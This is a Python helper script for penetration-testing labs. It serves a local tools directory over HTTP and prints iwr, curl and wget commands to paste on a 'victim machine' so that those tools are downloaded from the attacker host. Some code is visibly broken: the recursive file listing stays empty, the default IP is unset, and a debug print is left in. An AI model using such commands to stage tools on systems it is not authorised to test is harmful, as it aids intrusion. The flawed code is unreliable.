#!/usr/bin/env python3

# Refactor of tool-upload.py, meant for general use
# By: @d0xFF
# Basically the same as simple.http server, but generates some commands to copy and paste on the victim machine.

import argparse
import os
import netifaces as ni
import signal
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from blessings import Terminal

# Setup argument parser

parser = argparse.ArgumentParser(
    description="A script to create tool transfer lines, utilizing a variety of transfer methods\n\nSupported transfer methods: iwr, curl, wget",
    add_help=True
)

# setup default ip, assuming user is doing HTB or similar
tun_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

parser.add_argument("-i", "--ip", help="IP address of attacker machine (or redirector)", required=False)
parser.add_argument("-p", "--port", help="Port to listen on", required=False, default=8000, type=int)
parser.add_argument("-a", "--all", help="List all transfer method commands", required=False, action="store_true", default=False)
parser.add_argument("-t", "--transfer", help="Specify the transfer method (iwr, curl, wget)", required=False, default="iwr", choices=["iwr", "curl", "wget"])
parser.add_argument("-d", "--directory", help="Directory to serve files from", required=False, default="/home/kali/tools")
parser.add_argument("-o", "--output", help="Directory to write output files to", required=False, default=".", type=str)
parser.add_argument("-r", "--recursive", help="Recursively list files in subdirectories", required=False, action="store_true", default=False)
parser.add_argument("-v", "--verbose", help="Enable verbose output", required=False, action="store_true", default=False)
parser.add_argument("--version", action='version', version='%(prog)s 1.0', help="Show script version and exit")

args = parser.parse_args()

if args.recursive:
    files = []
    for root, dirs, filenames in os.walk(args.directory):
        for filename in filenames:
            # only add files, not directories
            if os.path.isfile(os.path.join(root, filename)):
                # Store relative path to the file
                if args.verbose:
                    print(f"Found file: {os.path.relpath(os.path.join(root, filename), args.directory)}")
else:
    files = os.listdir(args.directory)
    files = [f for f in files if os.path.isfile(os.path.join(args.directory, f))]

# Setup terminal for colored output
term = Terminal()
def print_colored(text, color):
    """Print text in specified color."""
    with term.location(5, term.height - 1):
        print(getattr(term, color)(text))

def print_iwr_commands(files):
    """Print iwr commands for each file."""
    print_colored("==  Powershell commands ===\n", 'blue')
    print("test")
    for file in files:
        print(f"iwr http://{args.ip}:{args.port}/{file} -OutFile {args.output}/{file}")
    print_colored("===========================\n\n", 'blue')

def print_curl_commands(files):
    """Print curl commands for each file."""
    print_colored("===  curl commands ===", 'green')
    for file in files:
        print(f"curl http://{args.ip}:{args.port}/{file} -o {args.output}/{file}")
    print_colored("=======================\n\n", 'green')

def print_wget_commands(files):
    print_colored("===  wget commands  ===", 'orange')
    for file in files:
        print(f"wget http://{args.ip}:{args.port}/{file} -O {args.output}/{file}")
    print_colored("======================\n\n", 'orange')

def print_everything(files):
    print_colored("===  All commands  ===", 'magenta')
    print_iwr_commands(files)
    print_curl_commands(files)
    print_wget_commands(files)

def print_transfer_commands(files):
    """Print commands based on the transfer method specified."""
    if args.all:
        print_everything(files)
    elif args.transfer == "iwr":
        print_iwr_commands(files)
    elif args.transfer == "curl":
        print_curl_commands(files)
    elif args.transfer == "wget":
        print_wget_commands(files)
    else:
        print_colored("Invalid transfer method specified. Defaulting to iwr.", 'red')
        print_iwr_commands(files)

# HTTP server things
httpd = None
server_thread = None

def start_server():
    global httpd, server_thread
    os.chdir(args.directory)
    httpd = HTTPServer((args.ip, args.port), SimpleHTTPRequestHandler)
    print_colored(f"Starting server on {args.ip}:{args.port}", 'cyan')

    # Run server in a separate thread, helps with graceful shutdown
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.start()

def shutdown_server(signal_received, frame):
    print_colored("\nSIGINT received, shutting down the server...", 'red')
    if httpd:
        httpd.shutdown()  # Gracefully stop the server
        httpd.server_close()
    if server_thread:
        server_thread.join()
    print_colored("Server shut down cleanly.", 'green')

# Register signal handler for graceful shutdown
signal.signal(signal.SIGINT, shutdown_server)

def main():
    print_transfer_commands(files)
    start_server()

    # Keep the main thread alive to handle server requests
    server_thread.join()

if __name__ == "__main__":
    main()